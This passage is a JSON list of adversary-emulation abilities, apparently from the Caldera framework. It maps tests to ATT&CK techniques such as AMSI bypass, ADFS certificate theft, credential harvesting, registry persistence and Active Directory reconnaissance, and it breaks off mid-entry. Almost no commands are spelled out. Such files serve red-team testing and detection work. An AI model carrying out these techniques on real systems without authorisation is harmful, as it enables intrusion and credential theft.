[
    {
        "description": "Pause all operations to avoid making noise",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Virtualization/Sandbox Evasion: Time Based Evasion",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "sleep 60",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "1-min sleep",
        "tactic": "defense-evasion",
        "plugin": "stockpile",
        "ability_id": "36eecb80-ede3-442b-8774-956e906aff02",
        "technique_id": "T1497.003",
        "repeatable": false
    },
    {
        "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Private Keys",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "ADFS token signing and encryption certificates theft - Local",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "2d78dfbfea7fa4ec7349993b83048079",
        "technique_id": "T1552.004",
        "repeatable": false
    },
    {
        "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Private Keys",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "ADFS token signing and encryption certificates theft - Remote",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "745d16045bcf10379b8cf2fa45f2b66e",
        "technique_id": "T1552.004",
        "repeatable": false
    },
    {
        "description": "Any easy way to bypass AMSI inspection is it patch the dll in memory setting the \"amsiInitFailed\" function to true.\nUpon execution, no output is displayed.\n\nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "AMSI Bypass - AMSI InitFailed",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "34952e2eefd3066c5f574744e1734ca6",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis test removes the Windows Defender provider registry key. Upon execution, no output is displayed.\nOpen Registry Editor and navigate to \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\\" to verify that it is gone.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "AMSI Bypass - Remove AMSI Provider Reg Key",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "392e12d6a466407e28d1bb51cf0729bb",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Executes powershell.exe with variations of the -Command parameter",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "ATHPowerShellCommandLineParameter -Command parameter variations",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "c0177717b47f2cd07949186523fa3c6b",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "106045f14741390cfb3fe95300585fb6",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Executes powershell.exe with variations of the -EncodedCommand parameter",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "fca2ce47cdb3acfde35139ca9017af80",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Executes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "a935a79ba61ecb00458208b0bd5ef15e",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Red teamer's avoid IEX and Invoke-WebRequest in your PowerShell commands. Instead, host a text record with a payload to compromise hosts.\n[reference](https://twitter.com/jstrosch/status/1237382986557001729)\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Abuse Nslookup with DNS Records",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "e2e6f33cf77d10e3c82c244014da20c5",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe\nCredential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos\nhttps://blog.malwarebytes.com/101/2016/01/the-windows-vaults/\nhttps://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores: Windows Credential Manager",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Access Saved Credentials via VaultCmd",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "10ce4e4c0a8d29ead8968da8156d8358",
        "technique_id": "T1555.004",
        "repeatable": false
    },
    {
        "description": "This Action demonstrates how an access token for a specific program can spawn another program under a different owner. \nAdversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. \nThis Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Create Process with Token",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Access Token Manipulation",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "6fae357c43fd211c9d39fe7583281bf0",
        "technique_id": "T1134.002",
        "repeatable": false
    },
    {
        "description": "Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.\nIf these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Credentials In Files",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Access unattend.xml",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "780cde60c956ccbff24c43ff7b7e70ea",
        "technique_id": "T1552.001",
        "repeatable": false
    },
    {
        "description": "The net utility is executed via cmd to enumerate domain user accounts.",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Account Discovery (all)",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "c7ec57cd-933e-42b6-99a4-e852a9e57a33",
        "technique_id": "T1087.002",
        "repeatable": false
    },
    {
        "description": "The net utility is executed via cmd to enumerate detailed information about a specific user account.",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Account Discovery (targeted)",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "364ea817-bbb9-4083-87dd-94b9dba45f6f",
        "technique_id": "T1087.002",
        "repeatable": false
    },
    {
        "description": "Use PowerView to query the Active Directory server to determine remote admins",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Domain Groups",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "has_admin"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.not_exists"
            },
            {
                "relationship_match": [
                    {
                        "source": "backup.admin.ability",
                        "edge": "first_failed"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.basic"
            },
            {
                "relationship_match": [
                    {
                        "source": "domain.user.name",
                        "edge": "has_password",
                        "target": "domain.user.password"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.basic"
            },
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "isAccessibleFrom"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.reachable"
            }
        ],
        "singleton": true,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Account-type Admin Enumerator",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "2afae782-6d0a-4fbd-a6b6-d1ce90090eac",
        "technique_id": "T1069.002",
        "repeatable": false
    },
    {
        "description": "The Adversaries can activate the default Guest user. The guest account is inactivated by default\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Valid Accounts: Default Accounts",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Activate Guest Account",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "4e0f69a36c9e0b956f08afd5824972ce",
        "technique_id": "T1078.001",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable and remove the Shut Down command Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Activate Windows NoClose Group Policy Feature",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "fa4ba6a06b4a5cd955ea5a60fae24281",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable Control Panel Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Activate Windows NoControlPanel Group Policy Feature",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "cab7b85611a290c0769546bfa9d6f962",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to hide all icons on Desktop Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Activate Windows NoDesktop Group Policy Feature",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "e74d2fb4ef5fa6c766a4151554033697",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove File menu from Windows Explorer Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Activate Windows NoFileMenu Group Policy Feature",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "257313a3c93e3bb7dfb60d6753b09e34",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Search menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Activate Windows NoFind Group Policy Feature",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "34041639e6e501856ecaf5969ee29c76",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to hide Properties from \"My Documents icon\" Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Activate Windows NoPropertiesMyDocuments Group Policy Feature",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "7fe6a66d03f4dbfc022609ba311c2b11",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Run menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Activate Windows NoRun Group Policy Feature",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "fd992e8ecfdac9b56dd6868904044827",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable changes to Taskbar and Start Menu Settings Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Activate Windows NoSetTaskbar Group Policy Feature",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "ba6f6214dbd17c54001e0a163b60f151",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable context menu for taskbar Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Activate Windows NoTrayContextMenu Group Policy Feature",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "4bfb5f265a5ce07af6bf10da113af7db",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Adds a non-malicious executable shortcut link to the current users startup directory. Test can be verified by going to the users startup directory and checking if the shortcut link exists. ",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Add Executable Shortcut Link to User Startup Folder",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "1f15ab22c39a9b6bb2bb0d77276dfcb3",
        "technique_id": "T1547.001",
        "repeatable": false
    },
    {
        "description": "Add a Network Share utilizing the command_prompt\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Add Network Share",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "3acf5046708b8ad68ecb7aeacbdd8d14",
        "technique_id": "T1070.005",
        "repeatable": false
    },
    {
        "description": "Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Port Monitors",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Add Port Monitor persistence in Registry",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "9cfb8e47dd14ee8f6d44afeaa294bab1",
        "technique_id": "T1547.010",
        "repeatable": false
    },
    {
        "description": "The following Atomic test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Subvert Trust Controls: Install Root Certificate",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Add Root Certificate to CurrentUser Certificate Store",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "9d21f3b551b40fa40056af1244af56ee",
        "technique_id": "T1553.004",
        "repeatable": false
    },
    {
        "description": "Install a driver via pnputil.exe lolbin\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Add a driver",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "5bf05600c43ae20df8e0723ce2c3c30b",
        "technique_id": "T1547",
        "repeatable": false
    },
    {
        "description": "Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.\nUpon execution, details of the new registry entries will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\.\n\nhttps://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Add domain to Trusted sites Zone",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "7a6e495200cd37c66f02e7bc070b61a9",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf)\nUser have to clic on the recycle bin to lauch the payload (here calc)\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Add persistance via Recycle bin",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "0dbdf1a2a87e718a6ac8a8e3415a7fac",
        "technique_id": "T1547.001",
        "repeatable": false
    },
    {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Adfind - Enumerate Active Directory Admins",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "fcef063a231fb18e8a4b87f96a97fd5b",
        "technique_id": "T1087.002",
        "repeatable": false
    },
    {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Adfind - Enumerate Active Directory Computer Objects",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "02f9ca082a6b35c0a753ce362dfea6f2",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain Controller Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Adfind - Enumerate Active Directory Domain Controller Objects",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "c8fa438e6b9728cf7fa05dfd4a80b2f3",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Adfind - Enumerate Active Directory Exchange AD Objects",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "28533078a7bb86154fcb6d2236fe59b4",
        "technique_id": "T1087.002",
        "repeatable": false
    },
    {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory OUs\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Domain Trust Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Adfind - Enumerate Active Directory OUs",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "ef70c2665d6e37720964fcd4f38c5ec8",
        "technique_id": "T1482",
        "repeatable": false
    },
    {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Subnet Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Adfind - Enumerate Active Directory Subnet Objects",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "fb491bb831fbb5d3dcd96c92a1aa1700",
        "technique_id": "T1016",
        "repeatable": false
    },
    {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Trusts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Domain Trust Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Adfind - Enumerate Active Directory Trusts",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "097bbd452cdc6506e728287c7084333f",
        "technique_id": "T1482",
        "repeatable": false
    },
    {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Adfind - Enumerate Active Directory User Objects",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "157278cc77e4503c58945cec5129f566",
        "technique_id": "T1087.002",
        "repeatable": false
    },
    {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Domain Groups",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Adfind - Query Active Directory Groups",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "856ccc398377c9404685983bc04dabb2",
        "technique_id": "T1069.002",
        "repeatable": false
    },
    {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. The example chosen illustrates adfind used to query the local password policy.\nreference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Adfind -Listing password policy",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "e2b2740289f34f77d74720f5c9edce3b",
        "technique_id": "T1087.002",
        "repeatable": false
    },
    {
        "description": "Manipulate Admin Account Name\n",
        "buckets": [
            "persistence"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Manipulation",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Admin Account Manipulate",
        "tactic": "persistence",
        "plugin": "atomic",
        "ability_id": "778e76984e52af739eff58d6cce22f42",
        "technique_id": "T1098",
        "repeatable": false
    },
    {
        "description": "Highly configurable file finder and stager for Linux and Windows. Drops a payload file to the host to parse\narguments rather than running multiple commands for each fact (e.g., each file type). This ability allows for a safe\nmode, only staging files found that have the appropriate file ending. The staging directory is configurable but\ndefaults to the current user's Recycle Bin (Windows) and /tmp (Linux). Payload files include default values for all\nparameters (matching the base fact source - File Search and Stage). Options for searches: file extensions (include,\nexclude [windows]), directories (include, exclude), accessed date cutoff, modified date cutoff, sensitive search\nstrings in files or titles.\n",
        "buckets": [
            "collection"
        ],
